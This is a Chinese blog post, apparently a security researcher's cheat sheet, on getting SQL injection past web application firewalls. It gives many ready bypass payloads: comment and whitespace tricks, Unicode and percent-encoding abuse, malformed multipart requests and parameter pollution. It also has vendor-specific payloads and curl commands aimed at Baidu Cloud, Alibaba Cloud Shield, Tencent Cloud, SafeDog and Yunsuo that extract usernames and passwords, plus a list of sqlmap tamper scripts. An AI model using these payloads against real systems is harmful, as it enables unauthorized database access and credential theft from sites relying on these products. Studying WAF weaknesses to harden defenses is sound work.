---
layout:     post
title:      BypassWaf_sql
date:       2019-1-7
author:     Wh0ale
header-img: img/sky_lanterns_by_wlop-d7b5nfg.jpg
catalog: true
tags:
    - sql
---

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyl7t8lzqkj215u0qjdj9.jpg)

# 0x01 BypassWaf_sql**

## 1. 数据库特性 

**①注释**

```
#
-- 
-- - 
--+ 
// 
/**/ 
/*letmetest*/ 
;%00
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyx86ua17xj20qz0h60we.jpg)

但/**/ > 1个就可以绕过waf



**科学计数法**

```
select id,id_number,weibo from table where id=0e1union select user,password,1e1from mysql.user
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyx851c8dbj20oh0d7mxk.jpg)



**空白字符：**

```
SQLite3 0A 0D 0C 09 20  MySQL5 09 0A 0B 0C 0D A0 20  
PosgresSQL 0A 0D 0C 09 20  Oracle 11g 00 0A 0D 0C 09 20  
MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16 ,17,18,19,1A,1B,1C,1D,1E,1F,2
```

**+号**

```sql
select * from users where user_id=1e8union(select+1,(select schema_name from information_schema.schemata limit 1));
union(select+1,(information_schema));
```

**-号**

```sql
select * from users where user_id=1e8union(select-1,(select schema_name from information_schema.schemata limit 1));
```

**`号**

```sql
select * from users where user_id=1e8union(select 1,(select `schema_name` from information_schema.schemata limit 1));
```

**~号**

```sql
select * from users where user_id=1e8union(select~1,(select schema_name from information_schema.schemata limit 1));
```

**!号**

```sql
select * from users where user_id=1e8union(select!1,(select schema_name from information_schema.schemata limit 1));
```

**@`形式**

```sql
select * from users where user_id=1e8union(select@`1`,(select schema_name from information_schema.schemata limit 1));
```

**点号.1**

```sql
select username from users where id=.1union/*.1*/select password from users;
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyy2o3ffeyj20md08n3yp.jpg)

**单引号双引号**

```sql
select username from users where id=.1union/*.1*/select"1",password from users;
```

**括号select(1)**

```sql
select * from users where user_id=1e8union(select 1,(select(schema_name)from information_schema.schemata limit 1));
```

>**mysql中的union用法**
>
>**union查询就是把2条或者多条sql语句的查询结果，合并成一个结果集。**
>
>如：sql1: N行，sql2: M行，sql1 union sql2 ---> N+M行
>
>**1、能否从2张表查询再union呢?**
>
>可以,union 合并的是"结果集",不区分在自于哪一张表.
>
>**2、取自于2张表,通过"别名"让2个结果集的列一致。那么,如果取出的结果集,列名字不一样,还能否union.**
>
>可以,而且取出的最终列名,以第1条sql为准
>
>**3、union满足什么条件就可以用了?**
>
>只要结果集中的列数一致就可以.（如都是2列或者N列）
>
>**4、union后结果集,可否再排序呢?**
>
>可以的。Sql1 union sql2 order by 字段
>
>注意: order by 是针对合并后的结果集排的序.
>
>**5、如果Union后的结果有重复(即某2行,或N行,所有的列,值都一样),怎么办?**
>
>这种情况是比较常见的,默认会去重.
>
>**6、如果不想去重怎么办?**
>
>union all

```sql
1、 union会去掉重复的行
SELECT id,num FROM num_a UNION SELECT id, num FROM num_b

2、order by对union后的结果集排序
SELECT id,num FROM num_a UNION SELECT id, num FROM num_b ORDER BY num DESC

3、UNION ALL不会过滤重复的行
SELECT id,num FROM num_a UNION ALL SELECT id, num FROM num_b

4、把num_a和num_b不同的索引结果保留， 相同的索引结果相加  然后输出：
SELECT a.id, ( a.num + b.num ) AS num FROM num_a AS a INNER JOIN num_b AS b ON a.id = b.id
UNION ALL
SELECT * FROM num_a AS a WHERE NOT EXISTS( SELECT * FROM num_b AS b WHERE a.id = b.id )
UNION ALL
SELECT * FROM num_b AS b WHERE NOT EXISTS( SELECT * FROM num_a AS a WHERE a.id = b.id )
ORDER BY id ASC

5、第二种方法用子查询分组统计，也可以达到同样的效果
SELECT id, SUM( num ) AS num FROM ( SELECT * FROM num_a a UNION ALL SELECT * FROM num_b b ) tmp
GROUP BY id;
https://www.cnblogs.com/ghostwu/p/8544333.html
```



## 2. Fuzzing

**云盾**

```sql
union+select 拦截 
select+from 不拦截 
select+from+表名 拦截 
union(select) 不拦截 所以可以不用在乎这个union了。 
union(select user from ddd) 拦截 
union(select%0aall) 不拦截 
union(select%0aall user from ddd) 拦截 
fuzz下select%0aall与字段之间 + 字段与from之间 + from与表名之间 + 表名与末尾圆括号之间可插入的符号。 
union(select%0aall{user}from{ddd}) 不拦截
crlf:
%0d=/r	回车符号
%0a=/n	换行符号
"/r/n"------0d0a	windows 常用
```

**Bypass Payload：**

```sql
1 union(select%0aall{x users}from{x ddd}) 
1 union(select%0adistinct{x users}from{x ddd}) 
1 union(select%0adistinctrow{x users}from{x ddd})
```

**可运用的sql函数&关键字：**

```sql
MySQL：
union distinct
union distinctrow
procedure analyse()
updatexml()
extracavalue()
exp()
ceil()
atan()
sqrt()
floor()
ceiling()
tan()
rand()
sign()
greatest()
字符串截取函数
Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)
字符串连接函数
concat(version(),'|',user());
concat_ws('|',1,2,3)
字符转换
Char(49)
Hex('a')
Unhex(61)
过滤了逗号
(1)limit处的逗号：
limit 1 offset 0
(2)字符串截取处的逗号
mid处的逗号：
mid(version() from 1 for 1)

MSSQL：
IS_SRVROLEMEMBER()
IS_MEMBER()
HAS_DBACCESS()
convert()
col_name()
object_id()
is_srvrolemember()
is_member()
字符串截取函数
Substring(@@version,1,1)
Left(@@version,1)
Right(@@version,1)
(2)字符串转换函数
Ascii('a') 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass
Char('97')
exec
```

**Mysql BIGINT数据类型构造溢出型报错注入**

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyya6vigxuj20py0fedhq.jpg)

BIGINT最大值进行增值运算的时候，signed/unsigned都会爆出BIGINT value is out of range的错误，也就是溢出了。还有就是Mysql逐位取反的特性，打个比方：

```sql
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)
mysql> select ~18446744073709551615;
+-----------------------+
| ~18446744073709551615 |
+-----------------------+
|                     0 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select 1-~0;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 - ~(0))'

mysql> select 1+~0;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'
```

[BIGINT Overflow Error Based SQL Injection](http://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html)

## **3.容器特性 **

**%特性：**
asp+iis的环境中，当我们请求的url中存在单一的百分号%时，iis+asp会将其忽略掉，而 没特殊要求的waf当然是不会的：

```sql
id =1' union sel%ect user f%rom ddd
```

**%u特性：**

iis支持unicode的解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但 waf就不一定了：  

````
id =1' union sel%ect user f%rom ddd
\u0069\u0064\u0020\u003D\u0031\u0027\u0020\u0075\u006E\u0069\u006F\u006E\u0020\u0073\u0065\u006C\u0025\u0065\u0063\u0074\u0020\u0075\u0073\u0065\u0072\u0020\u0066\u0025\u0072\u006F\u006D\u0020\u0064\u0064\u0064
%u0069%u0064%u0020%u003D%u0031%u0027%u0020%u0075%u006E%u0069%u006F%u006E%u0020%u0073%u0065%u006C%u0025%u0065%u0063%u0074%u0020%u0075%u0073%u0065%u0072%u0020%u0066%u0025%u0072%u006F%u006D%u0020%u0064%u0064%u0064
````

这个特性还存在另一个case，就是多个widechar会有可能转换为同一个字符。

```
s%u0065lect->select
s%u00f0lect->select
```

WAF对%u0065会识别出这是e，组合成了select关键字，但有可能识别不出%u00f0

其实不止这个，还有很多类似的

```
字母a：
%u0000
%u0041
%u0061
%u00aa
%u00e2
单引号：
%u0027
%u02b9
%u02bc
%u02c8
%u2032
%uff07
%c0%27
%c0%a7
%e0%80%a7
空白：
%u0020
%uff00
%c0%20
%c0%a0
%e0%80%a0
左括号(：
%u0028
%uff08
%c0%28
%c0%a8
%e0%80%a8
右括号)：
%u0029
%uff09
%c0%29
%c0%a9
%e0%80%a9
```

**畸形协议&请求**

**asp/asp.net**

还有asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交 方式，不管是GET还是POST，都可正常接收，过滤GET请求时如果没有对**application/xwww-form-urlencoded**提交数据方式进行过滤，就会导致任意注入。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyyakczniyj20p60hjtfc.jpg)

**php+Apache：**
waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没 有那么严格，当我们将协议随便定义时也是可以的：

PHP解析器在解析multipart请求的时候，它以逗号作为边界，只取boundary，而普通解 析器接受整个字符串。 因此，如果没有按正确规范的话，就会出现这么一个状况：首先 填充无害的data，waf将其视为了一个整体请求，其实还包含着恶意语句。

```
------,xxxx
Content-Disposition: form-data; name="img"; filename="img.gif"

GIF89a
------
Content-Disposition: form-data; name="id"

1' union select null,null,flag,null from flag limit 1 offset 1-- -
--------
------,xxxx--
```

**通用的特性`**

- HPP：

HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。

假设提交的参数即为：

id=1&id=2&id=3

```
Asp.net + iis：id=1,2,3 
Asp + iis：id=1,2,3 
Php + apache：id=3
```

- 双重编码：

这个要视场景而定，如果确定一个带有waf的site存在解码后注入的漏洞的话，会有效避过waf。

```
unlencode
base64
json
binary
querystring
htmlencode
unicode
php serialize
```

- 我们在整体测试一个waf时，可测试的点都有哪些？

  GET、POST、HEADER那么我们专门针对一个waf进行测试的时候就要将这几个点全测试个遍，header中还包括Cookie、X-Forwarded-For等，往往除了GET以外其他都是过滤最弱的。



# 0x02 各大厂商

正则逃逸： 过 滤 了 `%23%0a` 却 不 过 滤`%2d%2d%0a`

## 1. 百度云

**curl：**

```shell
curl http://192.168.211.237/test.php -d "id=1 union%23%0Aselect user,password from users"
```

**科学计数法：**

```
http://192.168.211.237/test.php?id=1e1union select user,password from users
```

**%23%0a**:

```
http://192.168.211.237/test.php?id=1e1union%23%0aselect user,password from users
```



## 2.阿里云盾

过滤了union+select+from，那我**select+from+union**呢？使用Mysql自定义变量的特性 就可以实现，这里举一个阿里云盾的案例：

```sql
select user_login from wp_users where id=1|@pwd:=(select user_pass from wp_users where id=1) union select @pwd;
```

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyyb3erd5pj20wz0gnwjb.jpg)

由于后面在调用自定义变量的时候需要用到union+select，所以还需要绕过这个 点。`/*ddd*/union/*ddd*/select ` 就可以了。

Bypass Payload：

```sql
id=1|@pwd:=(select username from users where id=4)/*ddd*/union/*ddd*/select null,@pwd
```



## 3.腾讯云

**腾讯云安全怎么检测sql注入**

- union+select拦截
- select+from拦截
- union+from不拦截

那么关键的点就是绕过这个select关键字

- select all
- select distinct
- select distinctrow

```
既然这些都可以，再想想使用这样的语句怎么不被检测到？select与all中间肯定不能用普 通 的 /**/ 这 种 代 替 空 格 ， 还 是 会 被 视 为 是 union+select 。 select all 可 以 这 么 表 达/*!12345select all*/，腾讯云早已识破这种烂大街的招式。尝试了下/*!*/中间也可以使 用%0a换行
```

payload:

```sql
select user,password from users where user_id=1 union/*!12345%0aselect%20all*/	被拦截
说明腾讯云在语法检测的时候会忽略掉数字后面的%0a换行，虽然属于union+12342select，但简单的数字和关键字区分识别还是做得到。
```

`/*!12345%0aselect%20all*/`还是会被拦截，这就说明腾讯云在语法检测的时候会忽略掉数字后面的%0a换行，虽然属于union+12342select，但简单的数字和关键字区分识别还是做得到。再测试`/*!12345select%0aall*/`结果就合乎推理了，根据测试知道腾讯云安全会忽略掉%0a换行，这就等于`union+12345selectall`， 不会被检测到。（忽略掉%0a换行为了过滤反而可以用来加以利用进行Bypass）

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyybvvpgi8j20m70awadq.jpg)

最终payload

```sql
id=1 union /*!12345select%0aall*/	因为把%0a忽略，加上/*12345*/绕过可union select检测
```

**Bypass Payload:**

```
1' union/*!50000select%0aall*/username from users%23
1' union/*!50000select%0adistinct*/username from users%23
1' union/*!50000select%0adistinctrow*/username from users%23
```

## 4.安全狗

不是绕不过狗，只是不够细心：

```sql
union+select拦截。
select+from拦截。
union+from不拦截。
fuzz了下/*!50000select*/这个5位数，前两位数<50 && 第二位!==0 && 后三位数==0即可bypass。(一点细节也不要放过。)
```

```
post:
id=1' union/*30100select*/user,password from users%23
```



![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyyd1s0dvpj20sa0ittlp.jpg)

在上一个网站被拦截，但是另一个网站不拦截

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyyd65c2f8j20yg0g7tld.jpg)

这里证明一个观点：好姿势不是死的，零零碎碎玩不转的姿势巧妙的结合一下。所 以说一个姿势被拦截不代表就少了一个姿势



## 5.云锁&360

云锁版本迭代导致的 & 360主机卫士一直存在的问题

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyydbfotp2j20sp0gktas.jpg)

  注意POST那个方向，waf在检测POST传输的数据过程中，没有进行URL的检测，也就是说waf会认为URL上的任何参数信息都是正常的。既然是POST请求，那就只检测请求正文咯。(神逻辑)

  在标准HTTP处理流程中，只要后端有接收GET形式的查询字段，即使客户端用POST传输，查询字符串上满足查询条件时，是会进行处理的。（没毛病）

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyyddqlzufj20vp0fsn0n.jpg)

当waf成了宕机的罪魁祸首是什么样的？举一个安全狗的案例：

```
/*666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 66666666666666666666666666666666666666666666666666666666666666666 6666666666666666666666666666666666666666*/
```

再举一个云锁也是因为数据包过长导致绕过的案例

云锁在开始检测时先判断包的大小是否为7250byte以下，n为填充包内容，设置n大 小为2328时，可以正常访问页面，但是会提示拦截了SQL注入,当数据包超过2329时就可以成功绕过，2329长度以后的就不检测了。？

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyydfv8surj20o70jbn80.jpg)

## 6.安全宝&阿里云盾

emoji是一串unicode字集组成，一个emoji图标占5个字节，mysq也支持emoji的存 储，在mysql下占四个字节:

[markdown颜文字](https://www.webfx.com/tools/emoji-cheat-sheet/)

:cry::cry::cry::cry::cry::cry::cry::cry::cry::cry:

:angry::angry::angry::angry::angry::angry::angry::angry::angry::angry:



# 0x03 自动化Bypass

首先总结下sqlmap的各种bypass waf tamper：

```python 
apostrophemask.py 用UTF-8全角字符替换单引号字符
apostrophenullencode.py 用非法双字节unicode字符替换单引号字符
appendnullbyte.py 在payload末尾添加空字符编码
base64encode.py 对给定的payload全部字符使用Base64编码
between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）
charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
equaltolike.py 用“LIKE”运算符替换全部等于号“=”
greatest.py 用“GREATEST”函数替换大于号“>”
halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释
ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
lowercase.py 用小写值替换每个关键字字符
modsecurityversioned.py 用注释包围完整的查询
modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询
multiplespaces.py 在SQL关键字周围添加多个空格
nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器
overlongutf8.py 转换给定的payload当中的所有字符
percentage.py 在每个字符之前添加一个百分号
randomcase.py 随机转换每个关键字字符的大小写
randomcomments.py 向SQL关键字中插入随机注释
securesphere.py 添加经过特殊构造的字符串
sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
space2comment.py 用“/**/”替换空格符
space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符
space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符
space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符
space2plus.py 用加号“+”替换空格符
space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”
unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符
varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF
versionedkeywords.py 用MySQL注释包围每个非函数关键字
versionedmorekeywords.py 用MySQL注释包围每个关键字
xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
```

看起来很全，但有个缺点就是功能单一，灵活程度面对当今的主流waf来说很吃力了。

提到系统的训练，鉴于多数waf产品是使用Rule进行防护，那么这里不说什么机器学习。来点简单粗暴有效果的修复方案：我把每个sql关键字比喻成“位”，将一个“位”的两边进行模糊插入各种符号，比如注释（# -- /**/）、逻辑运算符、算术运算符等等。

15年黄登在阿里云安全峰会提到的fuzz手法通过建立一个有毒标识模型，将将其插入到各种“位”，测试其waf。

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyydktkc14j20us0b6jv1.jpg)

最常见的四种sql注入语句：select、update、insert、delete

```
有毒标识定义为n
“位”左右插入有毒表示那么就是x的n次幂
而且其他数据库也各有各的语法糖，次数量定义为y
如果再将其编码转换定位为m
其结果最少就得有：

Factor[((x^n)*4 + x*y)*m]
```

通常waf引擎先转换m后再去匹配，这个还是要看场景。还有关键字不止这些，稍微复杂一点的环境就会需要更多的关键字来注入，也就会需要fuzz更多的位。还没说特殊字符，根据系统含有特殊意义的字符等等，也要有所顾忌。

当前几个关键字达到绕过效果时，只需继续fuzz后面几个位即可。

还有就是传输过程中可测试的点：

![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyydjllwo8j20ry02mgma.jpg)

因为当我们在传输的过程中导致的绕过往往是致命的，比如中间件的特性/缺陷，导致waf不能识别或者是在满足特定条件下的欺骗了waf。









reference:

[https://04z.net/archives/2030ee36.html](https://04z.net/archives/2030ee36.html)

[https://xz.aliyun.com/t/368](https://xz.aliyun.com/t/368)

先知上面的图片都挂了，我自己复现重新整理了下，半年前就看到这篇文章，到现在觉得还有很多东西要向作者学习，有需要我分享该文电子版的可以私聊我。继续加油叭。